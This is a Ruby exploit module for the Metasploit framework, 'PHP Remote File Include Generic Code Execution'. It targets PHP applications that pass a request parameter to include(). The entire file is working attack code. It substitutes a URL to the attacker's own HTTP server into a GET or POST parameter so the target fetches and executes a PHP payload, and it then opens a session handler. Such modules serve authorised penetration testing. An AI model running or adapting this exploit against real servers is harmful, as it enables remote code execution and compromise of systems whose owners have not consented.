##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::PHPInclude

  def initialize(info = {})
    super(update_info(info,
      'Name'		 => 'PHP Remote File Include Generic Code Execution',
      'Description'	 => %q{
          This module can be used to exploit any generic PHP file include vulnerability,
        where the application includes code like the following:

        <?php include($_GET['path']); ?>
      },
      'Author'		 => [ 'hdm' , 'egypt', 'ethicalhack3r', 'zacknagaich' ],
      'License'		 => MSF_LICENSE,
      #'References'	=> [ ],
      'Privileged'	 => false,
      'Payload'		 =>
        {
          'DisableNops' => true,
          'Compat'		=>
            {
              'ConnectionType' => 'find',
            },
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it's unlimited
          'Space'	=> 262144, # 256k
        },
      'DefaultOptions' =>
        {
          'WfsDelay' => 30
        },
      'DisclosureDate' => 'Dec 17 2006',
      'Platform'	 => 'php',
      'Arch'		 => ARCH_PHP,
      'Targets'		 => [[ 'Automatic', { }]],
      'DefaultTarget' => 0))

    register_options([
      OptString.new('PATH', [ true , "The base directory to prepend to the URL to try", '/']),
      OptString.new('PHPURI', [false, "The URI to request, with the include parameter changed to XXpathXX"]),
      OptString.new('POSTDATA', [false, "The POST data to send, with the include parameter changed to XXpathXX"]),
      OptString.new('HEADERS', [false, "Any additional HTTP headers to send, cookies for example. Format: \"header:value,header2:value2\""])
      ], self.class)
  end

    def check
        uri = datastore['PHPURI'] ? datastore['PHPURI'].dup : ""

        tpath = normalize_uri(datastore['PATH'])
        if tpath[-1,1] == '/'
            tpath = tpath.chop
        end

        if(uri and ! uri.empty?)
            uri.gsub!(/\?.*/, "")
            print_status("Checking uri #{rhost+tpath+uri}")
            response = send_request_raw({ 'uri' => tpath+uri})
            return Exploit::CheckCode::Detected if response.code == 200
            vprint_error("Server responded with #{response.code}")
            return Exploit::CheckCode::Safe
        else
            return Exploit::CheckCode::Unknown
        end
    end

  def datastore_headers
    headers = datastore['HEADERS'] ? datastore['HEADERS'].dup : ""
    headers_hash = Hash.new
    if (headers and ! headers.empty?)
      headers.split(',').each do |header|
        key,value = header.split(':')
        headers_hash[key] = value.strip
      end
    end
    headers_hash
  end

  def php_exploit
    uris = []

    tpath = normalize_uri(datastore['PATH'])
    if tpath[-1,1] == '/'
      tpath = tpath.chop
    end

    # PHPURI overrides the PHPRFIDB list
    if (datastore['PHPURI'] and not datastore['PHPURI'].empty? and (datastore['POSTDATA'].nil? or datastore['POSTDATA'].empty?) )
      uris << datastore['PHPURI'].strip.gsub('XXpathXX', Rex::Text.to_hex(php_include_url, "%"))
      http_method = "GET"
    elsif (datastore['POSTDATA'] and not datastore['POSTDATA'].empty?)
      uris << datastore['PHPURI']
      postdata = datastore['POSTDATA'].strip.gsub('XXpathXX', Rex::Text.to_hex(php_include_url, "%"))
      http_method = "POST"
    end

    # Very short timeout because the request may never return if we're
    # sending a socket payload
    timeout = 0.01

    # We can't make this parallel without breaking PHP findsock
    # Findsock payloads cause this loop to run slowly
    uris.each do |uri|
      break if session_created?

      vprint_status("Sending: #{rhost+tpath+uri}")
      begin
        if http_method == "GET"
          response = send_request_raw( {
            'global' => true,
            'uri'	 => tpath+uri,
            'headers' => datastore_headers,
          }, timeout)
        elsif http_method == "POST"
          response = send_request_raw(
            {
              'global'	=> true,
              'uri'	=> tpath+uri,
              'method'	=> http_method,
              'data'	=> postdata,
              'headers' => datastore_headers.merge({
                'Content-Type'	 => 'application/x-www-form-urlencoded',
                'Content-Length' => postdata.length
              })
            }, timeout)
        end
        handler
      rescue ::Interrupt
        raise $!
      rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused
        print_error("The target service unreachable")
        break
      rescue ::OpenSSL::SSL::SSLError
        print_error("The target failed to negotiate SSL, is this really an SSL service?")
        break
      rescue ::Exception => e
        print_error("Exception #{e.class} #{e}")
      end

      Thread.pass
    end
  end
end
